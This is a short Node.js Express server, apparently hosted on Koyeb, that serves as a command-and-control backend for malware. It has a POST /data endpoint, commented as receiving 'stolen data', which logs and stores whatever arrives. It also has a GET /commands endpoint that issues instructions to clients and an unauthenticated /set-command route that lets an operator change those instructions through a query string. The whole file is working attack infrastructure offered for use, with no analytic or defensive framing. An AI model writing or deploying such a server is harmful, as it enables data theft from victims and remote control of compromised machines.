const express = require('express');
const app = express();

// Use cloud dynamic port or fallback to 8000
const PORT = process.env.PORT || 8000;

// Temporary memory to hold our data and commands
let latestData = [];
let currentCommand = { command: "STAY_IDLE", timestamp: new Date() };

app.use(express.json());

// 1. Home route
app.get('/', (req, res) => {
    res.send('🚀 Sample Server is running perfectly on Koyeb!');
});

// 2. Endpoint to RECEIVE stolen data
app.post('/data', (req, res) => {
    const receivedData = req.body;
    console.log("Received Data:", receivedData);
    latestData.push({ ...receivedData, receivedAt: new Date() });
    res.json({status: "success"});
});

// 3. Endpoint to FETCH the current command
app.get('/commands', (req, res) => {
    res.json(currentCommand);
});

// 4. Endpoint to SET a new command
app.get('/set-command', (req, res) => {
    const newCmd = req.query.cmd || "STAY_IDLE";
    currentCommand = { command: newCmd, timestamp: new Date() };
    res.send(`Command updated to: ${newCmd}`);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is blasting off on port ${PORT}`);
});

